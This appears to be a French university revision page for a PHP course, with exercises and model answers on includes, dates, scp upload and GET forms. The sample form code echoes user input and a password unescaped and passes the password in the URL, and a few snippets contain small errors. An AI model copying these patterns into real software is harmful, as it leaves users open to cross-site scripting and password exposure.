<!DOCTYPE html>
<html lang="en">
  <head>
    <title>PHP2: TP1</title>
    <meta charset="utf-8">
    <meta name="description" content="Trucsweb.com" />    
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">  
	
    <link rel="stylesheet" href="../../../style/zoning.css" media="screen" />	
    <link rel="stylesheet" href="../../../style/contenuAccueil.css" media="screen" />
    <link rel="stylesheet" href="../../../style/calculatrice.css" media="screen" />
    <link rel="stylesheet" href="../../../style/examen.css" media="screen" />
    <link rel="stylesheet" href="../../../style/menu907.css" media="screen" />
    <link rel="stylesheet" href="../../../style/dropdown.css" media="screen" />	
    <link rel="stylesheet" href="../../../style/sticky.css" media="screen" /> 	
	<link rel="stylesheet" href="../../../style/top.css"  media="screen"><!--  Bouton remonter en haut de page -->		
    <link rel="stylesheet" href="../../../style/menu_accordeon.css" media="all"><!-- barre laterale gauche bas -->
	<link rel="stylesheet" href="../../../style/prism.css" media="screen" /> 
    
	<style>
	    #menu .dropdown2-container{min-width:11.76em !important; }
		#menu{ padding-left:20%; }
		#menu a, #menu .dropdown2-btn{ font-weight:normal; }
		.structureSujet, .questions_, .reponse_ {line-height:1.5;}
		.structureSujet{ font-size:0.9em;}
		.questions_{ padding-left:4em ; }
		.reponse_ { padding-left:3em ; }
		
		.greenNum, .blueNum, .redNum { 
		    color:black; 
            border-radius:50px;		
		}
		/********** ça fait un peu tâche. je vire tout pour faire propre( du noir sur fond blanc ) **************
		.greenNum { 
			box-shadow:
              0px 2px 4px 0px #4CAF50 inset,
              0px 2px 4px 0px inset;		
		}
		.blueNum { 
			box-shadow:
              0px 2px 4px 0px #2196F3 inset,
              0px 2px 4px 0px inset;		
		}
		.redNum { 
			box-shadow:
              0px 2px 4px 0px #a1008c inset,
              0px 2px 4px 0px inset;		
		}
		*********************************************************************************************/
		.greenNum, .blueNum, .redNum { 
			box-shadow:
			0px 16px 4px 0px white inset,
            0px 2px 4px 0px inset;		
		}
		
		.img{ 

		  width:87%;
		  height: 90% ;
		  padding:1.2em; 
		  margin:0 0 0 -1em;
		  box-shadow:
			0px 2px 2px 0px rgba(0, 0, 0, 0.5) inset,
			0px 2px 2px 0px rgba(255, 255, 255, 0.5);
		  border:1px solid #8c8b8b;
		  border-radius: 4px; 
          background:white;		  
		}
		.paragraphe{
			border:1px solid #8c8b8b; 
			padding: 0.5em 1em;
			line-height:1.5;
			margin:1em 0; 
			border-radius: 2px;
			display:inline-block;
			background:white;
			width:93.9%;
		}
		.petitParagraphe{
		   width:84% !important; 
		   padding-left:2em !important;
		}
		.moyenParagraphe{
		    width:89.8%;
			padding-left:0 !important;
		}
		
		.idS{
			border:1px solid #8c8b8b ; 
			padding:1px 4px; 
			border-radius:0 0 3px 3px;
									
			/* box-shadow:0.2px 2px 8px 0px #8c8b8b; */
			
			box-shadow:0.2px 2px 16px 0px #8c8b8b; 

			width:96.5%;
			background:white;
			margin-bottom:1em;
			
			/************************************************
			  Pour mettre un width sur un elt texte(inline):
			  display:inline-block; width:xxx;
			*************************************************/
		}
		.subQuestion{
		   line-height:1.5; 
		   background:white;
		   display:inline-block; width:98.2%;
		}
		.t-transparent{
		    line-height:1.5; 
			border:none;
			margin-top:2em !important;
			margin-bottom:0 !important;
			background:transparent !important;

        }
        .attention{
		  background:#ff1;
		  border-radius:2px;
		  padding:2px;
		}
        .indication{
		   margin-top:0;
		   padding-top:0;
		   margin-bottom:0;
		   padding-bottom:0;
		   background:transparent !important;
		   border:none;
		}
        .notaBene{
		  background:white;
		  margin:0;
		  width:86%;
		  padding-right:2em; 
		}
		
		
		
		.widget-asideD{
		  font:italic 0.8em calibri ligh ;
		  height:auto;
		  padding:0.5em 0.2em 0.5em 0.5em;
		}
		.widget-asideD ul {
		    margin:0.3em ;
			color:#8c8b8b;
		}
		.widget-asideD ul ~ .widget-asideD ul { 
		  color:black !important;
		}
		.widget-asideD ul li {
		    margin-left:-1.5em; margin-right:1em; 
		}
		
		
		
		.exemple{
			width:60%; 
			margin-bottom:0.4em;
		}
		pre{
			white-space:pre-line; 
			padding-left:2em !important;
			color:#999;
			
		}
		summary{
		  	outline:none !important;
			border:none !important;
		}
        		
	</style>

	
	<script type="text/javascript" src="../../../js/menu907.js"></script>
    <script type="text/javascript" src="../../../js/accesAuxPopUps.js"></script>
	<script type="text/javascript" src="../../../js/jquery3.4.1.min.js"></script><!-- moteur js: pour le chargement du sujet en mode ajax de la cuisine perso" -->
	<script type="text/javascript" src="../../../js/prism.js"></script>
    <script>
	    // mon p'tit ajax perso
		$(document).ready(function(){		
		   $(".unset_").click(function(){			  	
				$('#tpUn').replaceWith('<object  data="tp1-sujet.html" type="text/html" style="width:74%; height:162em;"  ></object>'); 
			    // Solution à la supperposition des sidebar par le footer( changer le scrollTop en fonction de la longuer de la page)
		        window.onscroll = function(){ remonter();  scrollFunction(); paSuperposerSujet();  }			
		   });			
		});
    </script>		   
  </head>

  <body id="corrige">
    <header>
        <hr  id="fantaisieRELOU3">
        <hr  id="fantaisieRELOU1">
        <h1  style='text-align:center'>Master MIASHS : Paris8 </h1>
        <h3  style='text-align:center'>Revisions PHP - Session 2019/2020  </h3>
        <h5  style='text-align:center; font-style:italic;'>TD, TP, Fiches-synthèse, Sujets corrigés </h5>
        <h1  style='text-align:center'>---</h1>
		<button class="openbtn" id="ejectBtn" onclick="openNav();  topFunction();">☰ </button>
        <hr  id="fantaisieRELOU1" >
        <hr  id="fantaisieRELOU3">
    </header>
	
	<!-- TOP MENU -->
	<div id="menu">	  
        <a href="../../../PHP/2017.html">Session 2017</a>	  
		<div class="dropdown2" >
			<button class="dropdown2-btn">Sessions 2018</button> 					  
			<div class="dropdown2-container">
				<a href="../../../PHP/2018s1.html">2018s1</a>
				<a href="../../../PHP/2018s2.html">2018s2</a>						
			</div>
		</div>
		
		<div class="dropdown2" >
			<button class="dropdown2-btn">Sessions 2019</button> 					  
			<div class="dropdown2-container">
				<a href="../../../PHP/2019s1.html">2019s1</a>
				<a href="../../../PHP/2019s2.html">2019s2</a>						
			</div>
		</div>
	</div>
	
	<div id="contenair"  > <!-- contient: le menu, les 2 barre laterales, et le contenu main  -->
		<!-- MENU LATERAL HAUT Gauche -->
		<div id="barre-laterale" >
			<div id="mySidepanel" class="sidepanel">
				<a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
				<a href="../../../index.html" id="iconAccueil"><img src="../../../photos/accueil.png" ></a>
				<a href="../../../index-ihm.html">IHM</a>
				<a href="../../../index-stat.html">Statistique</a>
				<a href="../../../index-ts.html">TS</a>
				<a href="../../../index-php.html">PHP</a>
				<a href="../../../index-html.html">HTML</a>
				<a href="../../../index-reseau.html">R&eacute;seaux</a>
				<a href="../../../index-reseau.html">Java</a>
				<a href="../../../index-lsf.html">LSF</a>
				<a href="../../../index-cms.html">CMS</a>
			</div>
		</div>
		
		<!-- MENU LATERAL BAS Gauche -->
		<aside class="sidebarGauche" id="sidebarGauche" style=" height:auto; z-index:1;">
			<div id="documenter_sidebar"  >		
				<div class="dropdown" >
					<button class="dropdown-btn">S2</button> 					  
					<div class="dropdown-container">
						<a href="../../../PHP/S2/tp1/tp1.html">TP1</a>
						<a href="../../../PHP/S2/tp2/tp2.html">TP2</a>
						<a href="../../../PHP/S2/tp3/tp3.html">TP3</a>						
					</div>
				</div>				
				<div class="dropdown" style="margin-bottom:0; padding-bottom:0;" >
					<button class="dropdown-btn">S1</button> 					  
					<div class="dropdown-container">
						<a  href="#" onclick="pop_tpSixPHP();" >TP6  Compte  bancaire</a> 
						<a  href="#" onclick="pop_controlTroisPHP();" >Contrôle 3</a>						
					</div>
				</div>
			</div>
		</aside> <!-- comment lui donner le mm height que <main> ? -->
		
		<!-- Barre laterale droite  -->
		<aside class="sidebarDroite saut " id="sidebarDroit">
			<div class="widget-asideD idS">
				<b>TP1:</b> <br>
				Les données sont stockées dans:
				<ul type="square">
				    <li>&dollar;_SESSION[ ] (exo1)</li>
					<li>&dollar;_COOKIE[ ] (exo2 et 3)</li>
					<li>Fichier.txt (exo4 ) </li>
				</ul>
				<small>&rArr; Pas besoin de Mysql(Apache suffit)</small>			 
			</div>			
			<div class="widget-asideD idS" style=" clear:both;" >			
				<b>Start Apache in <span style="color:#660033"><u>prompt Dos</u></span>:</b> <br>
				<span style="color:#8c8b8b">Path( cd <b style="color:red">/</b> &rArr; racine):</span>
				<ul type="square" style="color:black"> 
				    <li><small><span style="color:#aaa">C:\Users\Admin&gt;</span> &emsp;cd 	<b>../..</b></small></li>
					<li><small><span style="color:#aaa">C:&gt;</span> &emsp;cd wamp64/www/</small></li>
				</ul>
				<span style="color:#8c8b8b">Commande:</span>
				<ul type="square" style="color:black">
				    <li><small><span style="color:#aaa">&gt;</span> cd <b style="color:red">../..</b>/wamp64/www</small></li>
				    <li><small><span style="color:#aaa">&gt;</span> php -S localhost : n&deg; port</small></li>
				</ul>
			</div>
			<div class="widget-asideD idS" style=" clear:both;" >			
				<b>Start Apache in <span style="color:#660033"><u>git Bash</u></span>:</b> <br>
				<span style="color:#8c8b8b">Path( cd &rArr; ~ ): </span>
				<ul type="square" style="color:black"> 
					<li><small><span style="color:#aaa">~</span>&emsp;<b>&emsp;cd 	<b>../..</b></b></small></li>
					<li><small><span style="color:#aaa">/c</span>&emsp;<b>&emsp;cd wamp64/www/</b></small></li>
				</ul>
				<span style="color:#8c8b8b">Commande:</span>
				<ul type="square" style="color:black">
				    <li><small><span style="color:#aaa">&gt;</span> cd ~/<b style="color:red">../..</b>/wamp64/www</small></li>
				    <li><small><span style="color:#aaa">&gt;</span> php -S localhost : n&deg; port</small></li>
				</ul>
			</div>
		</aside>
		
		<!-- Contenu: pricipal -->	
		<main >		    
			<section class="bordureSupSection1 " ></section>			
			<section class="conteneurDesSujet" id="tpUn" >
            			
				<h2 class="matiere">PHP2: TP1</h2>		  
				<div class="success_  structureSujet"  >			  			  
					<p><u><a href="#"><strong>Rappels:</strong> </a></u></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%;"> &nbsp;<b style="color:gray">&bull; &emsp; Rappel sur les types </b></span>
					<ul type="none" style="line-height:1.5">
					     <li>
						    <details>
						      <summary>Expliquer les 5 principaux types de variables<br>&emsp;(sans oublier les variables pr&eacute;d&eacute;finies)</summary>
						      &emsp;&#8718; les types primitifs(integer, double, string)<br>
							  &emsp;&#8718; les float<br>
							  &emsp;&#8718; les booléens<br>
							</details>
						 </li>
						 <li>		     
							 <details>
						      <summary>Pour afficher les "string", on prèfère les quotes ou les guillemets ?<br>&emsp;Expliquer  Pourquoi </summary>
							  &emsp;&#8718; Les quotes<br>
							  &emsp;&#8718; Allège le traitement<br>
							</details>
						 </li>
				    </ul>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%;"> &nbsp;<b style="color:gray">&bull; &emsp; Rappel sur les boucles </b></span>
					<ul type="none" style="line-height:1.5">
						 <li>
							<details>
						      <summary>Quelles &ne; entre if-else, elseif, switch et l'opérateur ternaire ‘ <b>? :</b>’ ?</summary>
					           <ul type="square" class="paragraphe petitParagraphe"> 
							      <li>
								     Un switch est l'équivalent d'une succession de bloc if/else if/else<br>
									 Très rapide: accède une seul fois &agrave; la cellule mémoire afin de la comparer aux "case".
								  </li>
								  <li>
								     Alors qu'une succession de bloc if/else accède plusieurs fois à l'élément à comparer.
								  </li>
							   </ul>
							</details>
						 </li>
						 <li>						      
							<details>
							  <summary>Quelle &ne; entre <b>while</b> et <b>for </b>?</summary>
							   <ul type="square" class="paragraphe petitParagraphe" style="margin-bottom:0.4em !important; "> 
								  <li>
									 <b>for(<span style="color:#990099">itération</span>) { &emsp; instruction; &emsp; }</b><br><small> Repète la "<b><i>punition</i></b>" un "<b><i>nbFois</i></b>" précis et puis c'est tout.</small>
								  </li>
								  <li>
									 <b>while(<span style="color:#990033">condition</span>) { &emsp; instruction; &nbsp; <span style="color:#990099">itération; &emsp; </span> }</b><br><small> Lui, il est dingue! On peut l'foutre n'importe quoi, elle va répeter la "<b><i>punition</i></b>" tant que la connerie n'est pas vraie.<br>Même si <i style="color:#990033"> "condition = dateFinDuMonde"</i>, elle continue d'afficher la "<b><i>punition</i></b>"" jusqu'à planter la machine.</small>
								  </li>
							   </ul>
<span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%; background:#d2f2df !important;"> &nbsp;<b style="color:gray">&bull;</b>&emsp; Un exemple avec <b>while</b></span>
<div style="width:93.3%; margin-bottom:0.4em; ">
<pre style="margin-right:1em important;"><code class="language-php" ><source lang="php">  	
&lt;?php  	
	$n = 1;
	$nbFois = 10;
	while( $n &lt;= $nbFois ){
		echo $punition.'&lt;br/>';		
		$n++; 
	}
?>	
</source></code></pre>
<span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%; background:#d2f2df !important;"> &nbsp;<b style="color:gray">&bull;</b>&emsp; Un exemple avec <b>for</b></span>
<div style="width:93.3%;  margin-bottom:0.4em;">
<pre style="margin-right:1em important;"><code class="language-php" ><source lang="php">  	
&lt;?php  	
	$nbFois = 10;
	for( $i=0; $i &lt;= $nbFois; $i++ ){
		echo $punition.'&lt;br/>';		
	}
?>	
</source></code></pre>
</div>
                            </details>
						 </li>
					</ul>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%;"> &nbsp;<b style="color:gray">&bull; &emsp; Rappel sur les fonctions </b></span>
					<ul type="none" style="line-height:1.5">
					
						 <li>					     
							<details>
						      <summary>Quelle &ne; entre <b>print</b> et <b>echo </b>?</summary>
							  &emsp;&#8718; print ne prends qu'un seul argument.<br>
							  &emsp;&#8718; <b>int print ...</b>: print renvoie tjrs 1<br>
							  &emsp;&#8718; echo peut prendre +sieurs args (dans ce cas, pas d'parenthèses !)<br>
							  &emsp;&#8718; <b>void echo ...</b> : echo est plus rapide car il ne renvoie rien<br>
							</details>
						 </li>
						 <li>
						    <details>
						      <summary>Comment d&eacute;clare-t-on une fonction PHP ?</summary>
							  &emsp;&#8718; function nomFonction(arguments){ instructions }  <br>
							  &emsp;&#8718; function nomFonction(         ){ instructions }<br>
							</details>
							
						 </li>
						 <li>

                            <details>
						      <summary>Site officiel reference des fonction ?</summary>
							  &emsp;<b class="attention" style="border:4px solid red; background:gold;" >&#9888;</b> http://fr.php.net/manual/fr/funcref.php
							</details>							 
						 </li>
						 <li>
							<details>
						      <summary>Que font les fonctions <b>strlen()</b>, <b>str_replace()</b>, <b>str_shuffle()</b>, <b>strtolower()</b> ?</summary>
							  &emsp;&#8718;<b>strlen():</b> taille d'une chaîne<br>
							  &emsp;&#8718;<b>str_replace():</b> Remplace toutes les occurrences dans une chaîne<br>
							  &emsp;&#8718;<b>str_shuffle():</b> Mélange les caractères d'une chaîne<br>
							  &emsp;&#8718;<b>strtolower():</b> Renvoie une chaîne en minuscules<br>
							</details>
						 </li>
					</ul>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%;"> &nbsp;<b style="color:gray">&bull; &emsp; Rappel sur les tableaux </b></span>
					<ul type="none" style="line-height:1.5">
						 <li>
						    <div class="paragraphe petitParagraphe" style="background:#d2f2df; width:83% !important;"> <!-- ici un dispaly:block s'impose l'elt block à l'intérieur de l'eli inline -->
								Il existe deux types de tableaux :
								<ol>
								   <li>les tableaux num&eacute;rot&eacute;s</li>
								   <li>les tableaux associatifs</li>
								</ol>
                            </div>							
                       
						   	<details>
						      <summary>Donner un exemple en PHP, avec les deux types.</summary>
								<div class="exemple">
								   <span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%; background:white !important;">
									   <pre >
											&lt;?php
												<span style="color:green">//Tableau numéroté</span> 								
													$Prenoms=array();
													$Prenoms[0]='Paul';
													$Prenoms[1]='Jean';
													$Prenoms[2]='Jule';
													
												<span style="color:green">//Tableau associatif</span>
													$Personne=array();
													$Personne['Nom']="Jacques";
													$Personne['Prenom']="Jean";
													$Personne['Age']=99;									
											?>
										</pre>
									</span> 
								</div>
							</details>

						   	<details>
						        <summary>Quelle est la diff&eacute;rence entre les 2 ? </summary>
							    &emsp;&#8718; &dollar;Prenoms : les indices des éléments sont des nombres<br>
							    &emsp;&#8718; &dollar;Personne : les indices des éléments sont des chaînes de caractères<br>
							</details>
							
						   	<details>
						        <summary>Comment les parcourir ?(cf. for, foreach, print r).</summary>
								<div class="exemple" style="width:99% !important;">
								   <span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%; background:white !important;">
									   <pre  style="font-size:0.8em;">
											&lt;?php
												<span style="color:green">//Tableau numéroté</span> 																		
													$Prenoms = array( "Paul", "Jean", "jule" );
													foreach( $Prenoms as $value )  echo $value.'&lt;br&gt;';										
													
												<span style="color:green">//Tableau associatif</span>
													$personne = array( 'Nom'=>'Jacques', 'Prenom'=>'Jean', 'Age'=>'99' );
													foreach($personne as $value) echo $value.'&lt;br&gt;';									   										
											?>
										</pre>
									</span> 
								</div>
							</details>
						    <details>
						        <summary>Comment rechercher une valeur ? (cf. array key exists, in array, array search)</summary>
							    <!-- <div class="paragraphe petitParagraphe" style="background:white; width:83% !important; padding-left:2px; font-size:0.8em;"> -->
                                <div class="exemple" style="width:99% !important; ">
                                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; width:91.91%; background:white !important;">
									    <pre  style="font-size:0.9em; padding-left:0 !important;">
											&emsp;&#8718; Vérifiez si la colonne "Age" existe dans la table personne:<br>
											&emsp;&#8718; <b>if(array_key_exists("Age",$personne))</b> echo 'yes it exists';
											<p></p>
											&emsp;&#8718; Est-ce qu'il a une personne de 99ans dans la table  personne?<br>
											&emsp;&#8718; <b>echo array_search("99",$personnes);</b><small style="color:green">//return name column</small>
											<p></p>
											&emsp;&#8718; Est-ce que "Paul" il existe dans la table prenom<br>
											&emsp;&#8718; <b>if (in_array("Paul", $prenoms))</b> echo 'il est bien présent'
							            </pre>
									</span>
							   </div>
							</details>
                         
                         </li>
					</ul>
					<a href="#" class="unset_" >&Eacute;nonc&eacute; complet ... </a>
					<p></p>
				</div>
				<!-- Exercice1 -->
				<div class="info_  structureSujet" >
				    <p><u><a href="#"><strong>Exo1:</strong>  Premier programme en PHP </a></u></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9312;</small> &emsp; La fonction &emsp; <i style="color:#115;">include()</i> </b></span><br>
					 &emsp;Construire à l'aide de l'éditeur <b>emacs</b>, la page <b>index.php</b> .
					 Elle est constituée:<br>
					<ul type="disc" class="questions_" >
					     <li>d’une entête: entete.php </li>
						 <li>d’un corps:corps.php(contient le numéro du TP et de l’exercice) </li>
						 <li>d’un pied de page: piedPage.php </li>
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>

							 <pre><code class="language-html" ><source lang="html" line>
/********  entete.php ******/
&lt;!DOCTYPE html>
&lt;html lang="fr">
&lt;head>
	&lt;meta charset="utf-8">
	&lt;title> PHP2: TP1/Exercice1 &lt;/title>
&lt;/head>

&lt;body>
	&lt;header>	    
		&lt;div id="en-tete"> &lt;/div>
		&lt;div id="menu"> &lt;/div>						
	&lt;/header>
                            </source></code></pre>
                            <pre><code class="language-html" ><source lang="html" line>
/********  corps.php ******/
	&lt;div id="contenu">
		&lt;P> TP2: Exercice1&lt;/p>
	&lt;/div>   	
                             </source></code></pre>
							 <pre><code class="language-html" ><source lang="html" line>
/********  piedPage.php ******/
	&lt;footer>
        ...		
	&lt;/footer>
&lt;/body>
&lt;/html>   	
                             </source></code></pre>
							 <pre><code class="language-php" ><source lang="php" line>
/********  index.php ******/
&lt;?php 
     include 'entete.php';
     include 'corps.php'; 
     include 'piedPage.php'; 	 
?>    	
                             </source></code></pre>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9313;</small> &emsp; La fonction &emsp; <i style="color:#115;">setLocale()</i> </b></span><br>
					 &emsp;Dans le fichier entete.php, afficher la date en français<br>
					<span style="line-height:2em"> &emsp;&nbsp;&nbsp;(exple:“Mardi 2 mars 2020, 18h30”)</span>
                    <ul type="disc" class="questions_" >		   
						 <li>Une solution utilisant les tableaux( associatif ou numéroté) </li>
						 <li>Une solution utilisant la fonction setlocale() </li>
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						                         
							 <pre><code class="language-php" ><source lang="php" line>
/********  La fonction date() le fait en anglais ******/
&lt;?php
    // 2020-04-05 01:16:53
	echo date('Y-m-d H:i:s')."&lt;br/>"; 
    // Saturday 05 April 2020, 01:16	
	echo date('l j F Y, H:i')."&lt;br/>"; 	
	echo date('d F Y')."&lt;br/>";// 05 April 2020
	echo date('d/m/Y')."&lt;br/>";// 04/04/2020
?>   	
                             </source></code></pre>
							 <pre><code class="language-php" ><source lang="php" line>
/*** setlocale( ) + strftime() le font en français ***/
&lt;?php
	setlocale(LC_TIME, 'fra_fra');
	 
	// 2020-04-04 23:43:59 
	echo strftime('%Y-%m-%d %H:%M:%S'); 
    // samedi 04 avril 2020, 23:43	
	echo strftime('%A %d %B %Y, %H:%M');  
	echo strftime('%d %B %Y'). // 04 avril 2020
	echo strftime('%d/%m/%y'); //04/04/20
?>  	
                             </source></code></pre>
							 <pre><code class="language-php" ><source lang="php" line>
/*** Usage de tableau associatif ***/
    ??? 	
                             </source></code></pre>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9314;</small> &emsp; La commande &emsp; <i style="color:#115;">scp</i> </b></span><br>
					&emsp;Tester le tout en copiant les fichiers sur le serveur handiman (193.54.166.23)<br>
					<span style="line-height:2em"> &emsp;&nbsp;&nbsp;sous le r&eacute;pertoire <b>public html/TP1</b></span>

					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
				<pre><code class="language-php" ><source lang="php">
scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1	
                </source></code></pre>
					</details>
					<p></p>
				</div>
				
				
				
				
                <!-- Exercice2-->
				<div class="success_ structureSujet ">
					<p><u><a href="#"><strong>Exo2:</strong> Transmettre des donn&eacute;es d’une page &agrave; l’autre </a></u></p>
                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9312;</small> &emsp; La méthode &emsp; <i style="color:#115;">get</i> </b></span><br>
					&emsp;Ajouter un fichier "<b>form.php</b>" qui permet &agrave;  l'internaute
					d'entrer <br>							
				    <span style="line-height:2em"> &emsp;&nbsp;&nbsp;son <b>Nom</b>, son <b>Pr&eacute;nom</b>, et son <b>password</b>:</span>
                    
					<ul type="disc" class="questions_" >
                         <li>Méthode: <b>GET</b> </li>					
						 <li>Le <u>traitement</u> et <u>l'affichage</u> se font dans <b>corps.php</b></li>						 
						 <li>Dedans i fo un lien vers <b>form.php</b> </li>
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-html" ><source lang="html">
/********  form.php ******/
&lt;!DOCTYPE html>
&lt;html>
&lt;head>
	&lt;title>TP2: Exercice2&lt;/title>
&lt;/head>
&lt;body>
	&lt;form action="corps.php" method="get">
		Nom :     &lt;input type="text"     name="nom">
		Prénom:   &lt;input type="text"     name="prenom">
		Password: &lt;input type="password" name="password">		
	    &lt;input type="submit" name="submit" value="Envoyer">
	&lt;/form>
&lt;/body>
&lt;/html>	
</source></code></pre>
<pre><code class="language-php" ><source lang="php">
/********  corps.php ******/
&lt;div id="contenu">
	&lt;h3> TP2: Exercice1&lt;/h3>
&lt;/div>
&lt;?php  
   // COLLECT 
   $nom = $_GET["nom"];
   $prenom = $_GET["prenom"];
   $password = $_GET["password"];
   
  // AFFICHAGE
   echo '
	  &lt;p>Nom:          '.$nom.'     &lt;/p>
	  &lt;p>Prénom:       '.$prenom.'  &lt;/p>
	  &lt;p>Mot de passe: '.$password.'&lt;/p>        
   ';
?>
&lt;p>&lt;a href="form.php"> Formulaire de saisie &lt;/a>&lt;/p>	
</source></code></pre>
					</details>
					<p></p>	

					&emsp;Que se passe-t-il au niveau de l'URL, lors du passage des paramètres ?<br>							
				    <span style="line-height:2em"> &emsp;&nbsp;&nbsp; (<b>Nom</b>, <b>Pr&eacute;nom</b>, <b>password</b>)</span>
                    

					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe">
						     On y voit leurs valeurs
						 </div>
					</details>
					<p></p>	
                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9313;</small> &emsp; La fonction &emsp; <i style="color:#115;">isset()</i> </b></span><br>
					&emsp;Avant d'afficher les paramètres transmis, <b> vérifier</b><br>
					<ul type="disc" class="questions_" >
                         <li>S'ils sont bien positionnés[ <b>isset()</b> et <b>empty()</b> ] </li>					
						 <li>Sinon afficher un message d'erreur</li>						 
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  corps.php ******/

&lt;div id="contenu">
	&lt;h3> TP2: Exercice1&lt;/h3>
&lt;/div>
&lt;?php  
   // COLLECTE 
	   
   $nom = isset($_GET["nom"]) ? $_GET["nom"] : '';
   if(empty($nom))echo 'Entrer votre nom &lt;br>';
   
   $prenom = isset($_GET["prenom"]) ? $_GET["prenom"] : '';
   if(empty($prenom)) echo 'Entrer votre prenom &lt;br>';
   
   $password=isset($_GET["password"]) ? $_GET["password"] : '';
   if(empty($password)) echo 'Entrer votre password &lt;br>';
   
  // AFFICHAGE
  
   echo '
	  &lt;p>Nom:          '.$nom.'     &lt;/p>
	  &lt;p>Prénom:       '.$prenom.'  &lt;/p>
	  &lt;p>Mot de passe: '.$password.'&lt;/p>        
   ';
?>
&lt;p>&lt;a href="form.php"> Formulaire de saisie &lt;/a>&lt;/p>	
</source></code></pre>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9314;</small> &emsp; GET : &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
					&emsp;Ajouter dans le formulaire<br>
					<ul type="disc" class="questions_" >
                         <li >4.1 Un champs <b>puniton</b>(string)</li>
                         <li >4.2 Un champs <b>nbFois</b>(int): 10 par défaut</li>
                         <li >4.3 Modifier <b>corps.php</b> pour qu'il affiche "la punition" <b>nbFois</b></li>
                         <li >4.4 V&eacute;rifier si  <b>nbFois</b> est bien un entier(en le castant)</li>
                         <li >4.5 Limiter <b>nbFois</b> à 100</li>
                         <li >4.6 <span style="color:#990033">Quel danger pour le passage des pramètres</span>(au niveau de l'URL) </li>						 						 
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-html" ><source lang="html">
/********  form.php ******/
    ...  	
Punition : &lt;input type="text" name="punition"  >
nbFois:    &lt;input type="number" name="nbFois" value="10" >
	
</source></code></pre>
<span class="idS t-transparent" > &nbsp; Pour éviter les erreurs: Traiter séparement avant de concatener  &nbsp;&nbsp;<b class="attention" >&#9888;</b></span>
<pre><code class="language-php" ><source lang="php">
/********  corps.php ******/  	
&lt;?php  
  // COLLECTE 
  ...  
  $punition=isset($_GET["punition"]) ? $_GET["punition"] : '';
  if( empty($punition) ) echo 'Saisir la punition&lt;br>';
  
  // AFFICHAGE  
  ...	
  $n = 1;
  while( $n &lt;= 10 ){
	   echo $punition.'&lt;br/>';
	   $n++; 
	}
?>
&lt;p>&lt;a href="form.php"> Formulaire de saisie &lt;/a>&lt;/p>	
</source></code></pre>					
					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.3&emsp; Modifier <b>corps.php</b> pour qu'il affiche "la punition" <b>nbFois</b></span>
<pre><code class="language-php" ><source lang="php">
/********  corps.php ******/
    ...  	
&lt;?php  	
	$n = 1;
	while( $n &lt;= $nbFois ){
		echo $punition.'&lt;br/>';		
		$n++; 
	}
?>	
</source></code></pre>
					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.4&emsp; V&eacute;rifier si  <b>nbFois</b> est bien un entier(en le castant)</span>
<pre><code class="language-php" ><source lang="php">
/********  corps.php ******/
&lt;?php 
   $nbFois=isset($_GET["nbFois"]) ? (int) $_GET["nbFois"] : ''; 
?>	
</source></code></pre>
					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.5&emsp; Limiter <b>nbFois</b> à 100</span>
<pre><code class="language-php" ><source lang="php">
/********  corps.php ******/
&lt;?php 
    ...  	
	$n = 1;
	while( $n &lt;= $nbFois ){
		if($nbFois &lt;= 100 ){ echo $punition.'&lt;br/>';}			 			 
		else{  echo 'Nombre trop grand '; break;    }		 
		$n++;					
	}
?>	
</source></code></pre>
					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.6&emsp; <span style="color:#990033">Quel danger pour le passage des paramètres</span>(au niveau de l'URL)</span>
					<div class="paragraphe">
						N'importe qui peut modifier les paramètres(voir même les supprimer <span style="color:red">&#9760;</span> )
						dans la barre d'adresse de son navigateur !
					</div>
					</details>
					<p></p>
